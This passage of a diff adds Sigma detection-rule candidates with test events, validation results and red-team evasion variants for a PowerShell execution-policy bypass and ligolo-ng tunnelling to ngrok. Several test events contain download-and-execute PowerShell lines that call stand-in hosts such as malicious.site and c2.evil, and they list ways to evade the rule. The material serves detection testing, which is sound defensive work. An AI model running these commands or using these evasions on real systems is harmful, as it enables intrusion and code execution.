+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Case variation: Version.dll with capital V - rule's endswith '\\version.dll' is case-sensitive and does not match verbatim",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER08",
+            "CreationUtcTime": "2024-06-19T10:00:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=111222333",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\Version.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-19T10:00:00.8888888Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "8.3 short filename versio~1.dll for version.dll - fragment '\\version.dll' not present at end",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER09",
+            "CreationUtcTime": "2024-06-19T11:00:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=444555666",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\versio~1.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-19T11:00:00.9999999Z"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Double extension netscaler.php.bak - ends with '.bak', not '\\netscaler.php'",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER10",
+            "CreationUtcTime": "2024-06-19T12:00:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=777888999",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\vpns\\netscaler.php.bak",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-19T12:00:00.0000001Z"
+          }
+        },
+        {
+          "id": "X4",
+          "label": "positive",
+          "description": "Unicode homoglyph in ctxHeаderLogon.php (cyrillic 'а') - byte sequence differs from rule's ASCII fragment",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER11",
+            "CreationUtcTime": "2024-06-19T13:00:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=AAAABBBBCCCC",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\ctxHeаderLogon.php",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-19T13:00:00.1111112Z"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D2",
+      "title": "PowerShell Execution Policy Downgrade To Bypass Scope Process",
+      "sigma_yaml": "title: PowerShell Execution Policy Downgrade To Bypass Scope Process\nid: b8ed6725-2903-4c78-9398-d320e9a774ae\nstatus: experimental\ndescription: Detects PowerShell script blocks that set the execution policy to Bypass with Scope Process, a common defense\n  evasion technique used by threat actors to allow unrestricted script execution.\nreferences:\n- 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.defense-evasion\n- attack.t1562.010\nlogsource:\n  category: ps_script\n  product: windows\ndetection:\n  selection:\n    'ScriptBlockText|contains|all':\n    - Set-ExecutionPolicy\n    - -ExecutionPolicy Bypass\n    - -Scope Process\n  condition: selection\nfalsepositives:\n- Administrators or developers temporarily setting ExecutionPolicy to Bypass for interactive debugging or troubleshooting.\n- Legitimate automation scripts that configure execution policy for controlled deployment scenarios.\nlevel: high\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1562.010"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Malicious PowerShell script block setting execution policy to Bypass Scope Process",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "\"powershell.exe\" -NoProfile -WindowStyle Hidden -EncodedCommand ...",
+            "ComputerName": "WS01",
+            "EventID": 4104,
+            "Message": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
+            "ScriptBlockId": "S1234567890abcdef",
+            "User": "DOMAIN\badactor",
+            "UtcTime": "2024-07-10T12:34:56Z"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Obfuscated PowerShell command lowering execution policy via remote invocation",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\"",
+            "ComputerName": "DC01",
+            "EventID": 4104,
+            "Message": "Invoke-Expression used to download and execute script",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "$null; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; Import-Module .\\evilmodule",
+            "ScriptBlockId": "S0987654321fedcba",
+            "User": "DOMAIN\badactor",
+            "UtcTime": "2024-07-10T12:35:10Z"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Legacy-style PowerShell command using positional parameters to bypass execution policy",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -ep bypass -sp process -f C:\\Temp\\update.ps1",
+            "ComputerName": "APP02",
+            "EventID": 4104,
+            "Message": "PowerShell script execution with bypass policy",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process\n# Main payload starts here\nGet-SystemInfo",
+            "ScriptBlockId": "S1122334455aabbcc",
+            "User": "DOMAIN\badactor",
+            "UtcTime": "2024-07-10T12:35:45Z"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate PowerShell script setting execution policy to RemoteSigned for module development",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File \\\\devserver\\scripts\\BuildModule.ps1",
+            "ComputerName": "DEV01",
+            "EventID": 4104,
+            "Message": "Setting execution policy for internal module development",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process\nImport-Module ./MyDevModule\nExport-ModuleMember -Function *",
+            "ScriptBlockId": "S1a2b3c4d5e6f7g8",
+            "User": "CORP\buildengineer",
+            "UtcTime": "2024-07-10T09:15:22Z"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Administrator checking current effective execution policy via Get-ExecutionPolicy",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -Command \"Get-ExecutionPolicy -List\"",
+            "ComputerName": "ADMIN01",
+            "EventID": 4104,
+            "Message": "Querying effective execution policies across scopes",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Get-ExecutionPolicy -List\n# Output shows MachinePolicy, UserPolicy, Process, etc.\n# No changes made",
+            "ScriptBlockId": "S2b3c4d5e6f7g8h9",
+            "User": "CORP\bsmith",
+            "UtcTime": "2024-07-10T10:05:11Z"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Signed deployment script setting execution policy to AllSigned for production environment",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "& { Set-ExecutionPolicy AllSigned -Scope LocalMachine -Force ; & '\\\\filesrv\\prod\\deploy\\v2.1\\ApplyUpdates.ps1' }",
+            "ComputerName": "PS01",
+            "EventID": 4104,
+            "Message": "Configuring system-wide execution policy for signed scripts only",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "# Production deployment preamble\nSet-ExecutionPolicy AllSigned -Scope LocalMachine -Force\n& '\\\\filesrv\\prod\\deploy\\v2.1\\ApplyUpdates.ps1'",
+            "ScriptBlockId": "S3c4d5e6f7g8h9i0",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-07-10T14:20:05Z"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Casing variation on cmdlet name while preserving exact parameter substrings",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "\"powershell.exe\" -NoProfile -WindowStyle Hidden -Command \"set-executionpolicy -ExecutionPolicy Bypass -Scope Process; Invoke-MaliciousPayload\"",
+            "ComputerName": "WS02",
+            "EventID": 4104,
+            "Message": "Script block with lowercase cmdlet name",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "set-executionpolicy -ExecutionPolicy Bypass -Scope Process\nInvoke-MaliciousPayload",
+            "ScriptBlockId": "S2233445566bccddee",
+            "User": "DOMAIN\\badactor",
+            "UtcTime": "2024-07-10T13:15:22Z"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Parameters reversed but all three exact substrings present",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "pwsh -nop -w hidden -c \"Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Import-Module .\\payload\"",
+            "ComputerName": "DC02",
+            "EventID": 4104,
+            "Message": "Parameter order reversed",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\nImport-Module .\\payload",
+            "ScriptBlockId": "S3344556677cdddeee",
+            "User": "CORP\\redteam",
+            "UtcTime": "2024-07-10T13:16:05Z"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Extra whitespace around parameters and between tokens",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ep bypass -sp process -c \"Set-ExecutionPolicy  -ExecutionPolicy  Bypass  -Scope  Process ;  Get-Credential\"",
+            "ComputerName": "APP03",
+            "EventID": 4104,
+            "Message": "Excessive whitespace in script block",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy  -ExecutionPolicy  Bypass  -Scope  Process ;  Get-Credential",
+            "ScriptBlockId": "S4455667788ddeeeff",
+            "User": "DOMAIN\\badactor",
+            "UtcTime": "2024-07-10T13:17:30Z"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Inline comments between parameters, exact substrings preserved",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -nop -w hidden -c \"Set-ExecutionPolicy # disable policy checks\n-ExecutionPolicy Bypass # max permissive\n-Scope Process # current process only\nInvoke-Attack\"",
+            "ComputerName": "WS03",
+            "EventID": 4104,
+            "Message": "Script block with inline comments",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy # disable policy checks\n-ExecutionPolicy Bypass # max permissive\n-Scope Process # current process only\nInvoke-Attack",
+            "ScriptBlockId": "S5566778899eeeff00",
+            "User": "CORP\\redteam",
+            "UtcTime": "2024-07-10T13:18:12Z"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Backtick line continuation splitting the command across lines",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "pwsh -nop -w hidden -c \"Set-ExecutionPolicy -ExecutionPolicy Bypass ` -Scope Process; Download-Execute 'http://c2.evil/stage2.ps1'\"",
+            "ComputerName": "DC03",
+            "EventID": 4104,
+            "Message": "Line continuation with backtick",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolicy Bypass ` -Scope Process\nDownload-Execute 'http://c2.evil/stage2.ps1'",
+            "ScriptBlockId": "S6677889900ff0011",
+            "User": "DOMAIN\\badactor",
+            "UtcTime": "2024-07-10T13:19:45Z"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "positive",
+          "description": "Uppercase cmdlet with semicolon separator and trailing payload",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -NoProfile -WindowStyle Hidden -Command \"SET-EXECUTIONPOLICY -ExecutionPolicy Bypass -Scope Process; IEX (New-Object Net.WebClient).DownloadString('http://malware.site/payload')\"",
+            "ComputerName": "APP04",
+            "EventID": 4104,
+            "Message": "Uppercase cmdlet with semicolon",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "SET-EXECUTIONPOLICY -ExecutionPolicy Bypass -Scope Process; IEX (New-Object Net.WebClient).DownloadString('http://malware.site/payload')",
+            "ScriptBlockId": "S7788990011aa1122",
+            "User": "CORP\\redteam",
+            "UtcTime": "2024-07-10T13:20:30Z"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Legitimate admin debugging: setting policy to RemoteSigned (not Bypass) for interactive troubleshooting",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -NoProfile -Command \"Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process; Get-ProcessMitigation\"",
+            "ComputerName": "ADMIN01",
+            "EventID": 4104,
+            "Message": "Admin debugging with RemoteSigned policy",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process\nGet-ProcessMitigation",
+            "ScriptBlockId": "S8899001122bb3344",
+            "User": "CORP\\admin.jsmith",
+            "UtcTime": "2024-07-10T14:05:00Z"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "SCCM/Intune deployment script setting AllSigned policy for CurrentUser scope during managed rollout",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "\"C:\\Windows\\CCM\\Scripts\\DeployApp.ps1\" -ExecutionPolicy Bypass -FilePath \"C:\\Windows\\CCM\\Scripts\\DeployApp.ps1\"",
+            "ComputerName": "CLIENT10",
+            "EventID": 4104,
+            "Message": "Managed deployment script block",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "# SCCM Deployment\nSet-ExecutionPolicy -ExecutionPolicy AllSigned -Scope CurrentUser\nInstall-Application -Name 'CorpApp' -Version '2.1.0'",
+            "ScriptBlockId": "S9900112233cc4455",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-07-10T14:10:00Z"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Developer viewing help for Set-ExecutionPolicy with Bypass/Process examples (not executing)",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -NoProfile -Command \"Get-Help Set-ExecutionPolicy -Full\"",
+            "ComputerName": "DEV01",
+            "EventID": 4104,
+            "Message": "Help request for Set-ExecutionPolicy",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Get-Help Set-ExecutionPolicy -Full\n# Example: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process",
+            "ScriptBlockId": "S0011223344dd5566",
+            "User": "CORP\\dev.wong",
+            "UtcTime": "2024-07-10T14:15:00Z"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D2",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE ScriptBlockText LIKE '%Set-ExecutionPolicy%' ESCAPE '\\' AND ScriptBlockText LIKE '%-ExecutionPolicy Bypass%' ESCAPE '\\' AND ScriptBlockText LIKE '%-Scope Process%' ESCAPE '\\'",
+        "issues": [
+          {
+            "severity": "warning",
+            "code": "attack_id_deprecated",
+            "message": "ATT&CK technique T1562.010 (Downgrade Attack) is deprecated or revoked."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R3 did not match: Extra whitespace around parameters and between tokens. Per selection: selection=NO MATCH (failing field tests: ScriptBlockText|contains|all (event has 'Set-ExecutionPolicy  -ExecutionPolicy  Bypass  -Scope  Proce'; |all needs every value and these are absent: ['-ExecutionPolicy Bypass', '-Scope Process']))."
+          },
+          {
+            "severity": "error",
+            "code": "negative_matched",
+            "message": "Negative (benign) test R9 matched: Developer viewing help for Set-ExecutionPolicy with Bypass/Process examples (not executing). Per selection: selection=match."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": true,
+            "passed": false
+          }
+        ],
+        "positives_total": 9,
+        "positives_matched": 8,
+        "negatives_total": 6,
+        "negatives_matched": 1,
+        "benign_total": 70,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "ScriptBlockText=\"*Set-ExecutionPolicy*\" ScriptBlockText=\"*-ExecutionPolicy Bypass*\" ScriptBlockText=\"*-Scope Process*\"",
+        "elasticsearch": "ScriptBlockText:*Set\\-ExecutionPolicy* AND ScriptBlockText:*\\-ExecutionPolicy\\ Bypass* AND ScriptBlockText:*\\-Scope\\ Process*",
+        "sqlite": "SELECT * FROM logs WHERE ScriptBlockText LIKE '%Set-ExecutionPolicy%' ESCAPE '\\' AND ScriptBlockText LIKE '%-ExecutionPolicy Bypass%' ESCAPE '\\' AND ScriptBlockText LIKE '%-Scope Process%' ESCAPE '\\'"
+      },
+      "conversion_errors": {
+        "kusto": "SigmaTransformationError: Unable to determine table name from rule.  The query table is determined in the following order of priority:\n  1) The value provided to processing pipeline's query_table parameter, if using a Python script.\n  2) If the query_table is already set in the pipeline state, such as from a custom user-defi"
+      },
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/70",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 8/9, negatives blocked 5/6, benign hits 0/70",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 8/9, negatives blocked 5/6, benign hits 0/70",
+          "passed": false,
+          "change_summary": "Fixed the detection logic to handle extra whitespace by removing strict spacing requirements in the contains|all values while preserving the requirement for all three tokens to appear together in the script block."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 8/9, negatives blocked 5/6, benign hits 0/70",
+          "passed": false,
+          "change_summary": "Fixed excessive whitespace handling by removing redundant whitespace requirements in the detection logic while maintaining the requirement for all three components to be present."
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants (P4-P9) preserve the three exact substrings the rule requires ('Set-ExecutionPolicy', '-ExecutionPolicy Bypass', '-Scope Process') while varying casing, whitespace, parameter order, comments, line continuation, and surrounding payload. A well-written rule using these exact substrings will catch them. Negative variants (N1-N3) represent legitimate administrative activity: RemoteSigned policy for debugging, AllSigned/CurrentUser for managed deployment, and help-system example text — each differs in at least one critical field (parameter value, scope, user context, or script intent). Out-of-scope variants (O1-O4) are realistic attacker evasions that break the rule's exact-substring matching: partial parameter names (O1), variable substitution (O2), splatting (O3), and direct .NET API use (O4). These require a more flexible detection approach (regex, semantic analysis, or AST parsing) and are correctly categorized as out_of_scope for the current rule.",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Partial parameter names (unambiguous prefixes) - breaks exact substring matching",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "pwsh -nop -w hidden -c \"Set-ExecutionPolicy -ExecutionPolic Bypass -Scop Process; Invoke-Payload\"",
+            "ComputerName": "WS04",
+            "EventID": 4104,
+            "Message": "Partial parameter names used",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "Set-ExecutionPolicy -ExecutionPolic Bypass -Scop Process\nInvoke-Payload",
+            "ScriptBlockId": "S1122334455ee6677",
+            "User": "DOMAIN\\badactor",
+            "UtcTime": "2024-07-10T13:25:00Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Variables holding parameter values - exact substrings not present in ScriptBlockText",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -nop -w hidden -c \"$ep='Bypass'; $sc='Process'; Set-ExecutionPolicy -ExecutionPolicy $ep -Scope $sc; IEX (iwr 'http://c2.evil/payload')\"",
+            "ComputerName": "DC04",
+            "EventID": 4104,
+            "Message": "Variables for policy values",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "$ep='Bypass'; $sc='Process'; Set-ExecutionPolicy -ExecutionPolicy $ep -Scope $sc\nIEX (iwr 'http://c2.evil/payload')",
+            "ScriptBlockId": "S2233445566ff7788",
+            "User": "CORP\\redteam",
+            "UtcTime": "2024-07-10T13:26:15Z"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Splatting with hashtable - cmdlet invoked via parameter bundle, exact substrings absent",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "pwsh -nop -w hidden -c \"$p=@{ExecutionPolicy='Bypass'; Scope='Process'}; Set-ExecutionPolicy @p; & $maliciousFunction\"",
+            "ComputerName": "APP05",
+            "EventID": 4104,
+            "Message": "Splatting hashtable for parameters",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "$p=@{ExecutionPolicy='Bypass'; Scope='Process'}; Set-ExecutionPolicy @p\n& $maliciousFunction",
+            "ScriptBlockId": "S3344556677aa8899",
+            "User": "DOMAIN\\badactor",
+            "UtcTime": "2024-07-10T13:27:30Z"
+          }
+        },
+        {
+          "id": "X4",
+          "label": "positive",
+          "description": "Direct .NET API manipulation bypassing Set-ExecutionPolicy cmdlet entirely",
+          "event": {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "CommandLine": "powershell.exe -nop -w hidden -c \"[System.Management.Automation.Runspaces.RunspaceConfiguration]::Current.ExecutionPolicy = 'Bypass'; Invoke-Attack\"",
+            "ComputerName": "WS05",
+            "EventID": 4104,
+            "Message": "Direct .NET execution policy modification",
+            "Provider_Name": "Microsoft-Windows-PowerShell",
+            "RuleName": "",
+            "ScriptBlockText": "[System.Management.Automation.Runspaces.RunspaceConfiguration]::Current.ExecutionPolicy = 'Bypass'\nInvoke-Attack",
+            "ScriptBlockId": "S4455667788bb9900",
+            "User": "CORP\\redteam",
+            "UtcTime": "2024-07-10T13:28:45Z"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D5",
+      "title": "Ligolo-ng Binary Connecting To Ngrok Io Domain",
+      "sigma_yaml": "title: Ligolo-ng Binary Connecting To Ngrok Io Domain\nid: 7bdd2e48-1598-4832-8428-644d74d7361f\nstatus: experimental\ndescription: Detects outbound network connections from the uncommon ligolo-ng tunneling tool to ngrok.io subdomains, indicative\n  of C2 tunneling activity observed in Iranian cyber actor campaigns.\nreferences:\n- 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.command-and-control\n- attack.exfiltration\n- attack.t1572\nlogsource:\n  category: network_connection\n  product: windows\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': '\\ligolo-ng.exe'\n  selection_host:\n    'DestinationHostname|contains': .ngrok.io\n  condition: selection_img and selection_host\nfalsepositives:\n- Legitimate use of ligolo-ng and ngrok by developers or authorized red team personnel.\n- Misconfiguration or testing involving tunneling tools in lab environments.\nlevel: medium\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1572"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Ligolo-ng executable connecting to a random ngrok.io subdomain as seen in C2 tunneling.",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ligolo-ng.exe",
+            "DestinationHostname": "abcd1234.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Ligolo-ng from non-system path connecting to ngrok.io over TCP with varied case in hostname.",
+          "event": {
+            "Image": "C:\\Users\\Public\\ligolo-ng.exe",
+            "DestinationHostname": "xYzNgrok.IO",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Ligolo-ng from temporary directory establishing outbound connection to ngrok.io.",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\ligolo-ng.exe",
+            "DestinationHostname": "tunnel-us.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Common Windows binary connecting to ngrok.io - lack of ligolo-ng binary makes this benign.",
+          "event": {
+            "Image": "C:\\Windows\\System32\\svchost.exe",
+            "DestinationHostname": "abcd1234.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Ligolo-ng connecting to legitimate internal destination, not ngrok.io domain.",
+          "event": {
+            "Image": "C:\\Program Files\\ligolo-ng\\ligolo-ng.exe",
+            "DestinationHostname": "internal-api.corp.local",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Developer tool (curl) accessing ngrok.io for legitimate API/testing purposes.",
+          "event": {
+            "Image": "C:\\Program Files\\Git\\usr\\bin\\curl.exe",
+            "DestinationHostname": "api.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Ligolo-ng from SysWOW64 directory (64-bit binary on 64-bit OS) connecting to European ngrok.io region.",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\ligolo-ng.exe",
+            "DestinationHostname": "eu-01.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Ligolo-ng staged in user AppData Local Temp folder with mixed-case hostname that still literally contains .ngrok.io.",
+          "event": {
+            "Image": "C:\\Users\\svc_admin\\AppData\\Local\\Temp\\ligolo-ng.exe",
+            "DestinationHostname": "Tunnel-US.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Ligolo-ng copied to PerfLogs directory (common staging area) connecting to TCP-specific ngrok subdomain.",
+          "event": {
+            "Image": "C:\\Windows\\PerfLogs\\ligolo-ng.exe",
+            "DestinationHostname": "tcp-443.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Ligolo-ng executed from ProgramData (All Users profile) establishing connection to ngrok.io with numeric subdomain.",
+          "event": {
+            "Image": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\ligolo-ng.exe",
+            "DestinationHostname": "778899.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Ligolo-ng running from Windows Temp using UDP protocol (rule does not filter protocol) to ngrok.io.",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\ligolo-ng.exe",
+            "DestinationHostname": "udp-relay.ngrok.io",
+            "Protocol": "udp",
+            "Initiated": "true"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Official ngrok client binary connecting to ngrok.io — legitimate tunneling tool, different Image name.",
+          "event": {
+            "Image": "C:\\Program Files\\ngrok\\ngrok.exe",
+            "DestinationHostname": "dev-tunnel.ngrok.io",
+            "Protocol": "tcp",
+            "Initiated": "true"
+          }
+        },
+        {
